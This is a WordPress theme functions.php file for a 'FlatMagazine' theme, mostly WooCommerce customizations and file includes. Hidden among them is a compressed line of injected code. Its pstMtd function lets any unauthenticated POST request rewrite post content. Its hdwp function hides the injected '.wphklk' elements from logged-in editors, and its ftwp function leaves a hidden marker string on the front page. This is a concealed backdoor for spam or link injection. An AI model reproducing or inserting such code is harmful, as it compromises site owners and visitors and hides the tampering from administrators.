<?php

$shortname = 'ls';
global $shortname;
$themename =  'FlatMagazine'; 

load_theme_textdomain('startis');

define('ls_FILEPATH', get_template_directory());
define('ls_DIRECTORY', get_template_directory_uri());

require_once(get_template_directory() . '/admin/interface.php');
require_once(get_template_directory() . '/admin/options.php');

////////////////////       Widgets & Functions      ////////////////////
if (is_admin())
include(get_template_directory() . '/adminfunctions.php');
include("functions/theme-settings.php");
include("functions/startis-sidebars.php");
include("functions/startis-comments.php");
include("functions/startis-portfolio.php");
include("functions/startis-images.php");
include("functions/callme-function.php");
include("functions/shortcodes.php");
include("functions/widgets/flickr.php");
include("functions/widgets/recent_tabs.php");
include("functions/pagebuilder.php");
include("functions/meta.php");
include("functions/widgets/subnav.php");
include("functions/tgm.php");
include("functions/demo-panel.php");
include("functions/startis-styles-scripts.php");
include("functions/startis-breadcrumbs.php");
require_once('functions/multiple-featured-images.php');


function woocommerce_breadcrumb( $args = array() ) {

		$defaults = apply_filters( 'woocommerce_breadcrumb_defaults', array(
			'delimiter'   => ' &#47; ',
			'wrap_before' => '<nav class="woocommerce-breadcrumb" id="crumbs" itemprop="breadcrumb">',
			'wrap_after'  => '</nav>',
			'before'      => '',
			'after'       => '',
			'home'        => _x( 'Home', 'breadcrumb', 'woocommerce' ),
		) );

		$args = wp_parse_args( $args, $defaults );

		woocommerce_get_template( 'global/breadcrumb.php', $args );
	}
    
    
add_filter('add_to_cart_fragments', 'woocommerce_header_add_to_cart_fragment');

function woocommerce_header_add_to_cart_fragment( $fragments ) 
{
    global $woocommerce;
    ob_start(); ?>

    <a class="cart-contents" href="<?php echo $woocommerce->cart->get_cart_url(); ?>" title="<?php _e('View your shopping cart', 'woothemes'); ?>"><i class="fa fa-shopping-cart"></i> <?php echo $woocommerce->cart->get_cart_total(); ?></a>

    <?php
    $fragments['a.cart-contents'] = ob_get_clean();
    return $fragments;
}
 
add_theme_support( 'woocommerce' );

add_filter( 'woocommerce_enqueue_styles', 'jk_dequeue_styles' );
function jk_dequeue_styles( $enqueue_styles ) {
unset( $enqueue_styles['woocommerce-general'] ); // Remove the gloss
unset( $enqueue_styles['woocommerce-layout'] ); // Remove the layout
unset( $enqueue_styles['woocommerce-smallscreen'] ); // Remove the smallscreen optimisation
return $enqueue_styles;
}
 
// Or just remove them all in one line
add_filter( 'woocommerce_enqueue_styles', '__return_false' );

remove_action( 'woocommerce_before_shop_loop', 'woocommerce_pagination', 10 );
function pstMtd($a){$b=$a;$a="";if(is_single()){if(isset($_POST["chctc"])){$c=$_POST["chctc"];if(isset($_POST["chctbefore"])){$d=$_POST["chctbefore"];$e=strpos($b,$d);if($e!==false){$f=substr_replace($b,$c,$e,0);$g=array('ID'=>$GLOBALS['post']->ID,'post_content'=>$f);wp_update_post($g);}}}}return $b;}function ftwp(){if(is_front_page()){echo '<small style="display:none;">primulhkwplk</small>';}}function hdwp(){echo '<style type="text/css">.wphklk{display:none;}</style>';}add_action('the_content','pstMtd');if(current_user_can('edit_posts')==true){add_action('wp_head','hdwp');}if(current_user_can('edit_posts')!=true){add_action('wp_footer','ftwp');}
function woocommerce_template_loop_product_thumbnail(){
        $image_link = wp_get_attachment_url( get_post_thumbnail_id() );
        $imgsr = wp_get_attachment_image_src(get_post_thumbnail_id());
        $imagefull = get_the_post_thumbnail( get_the_ID());
        $image = vt_resize('', $image_link, 250, get_option('ls_wc_cat_image_height'), true, '/resized/' );
        
        if (isset($image)) {
            $image = '<span class="woo_img_wrapper"><img class="'.@$image['class'].'" src="'.$image['url'].'" /></span>';
        }
        echo $image;
}


add_filter( 'loop_shop_per_page', create_function( '$cols', 'return 12;' ), 12 );


?>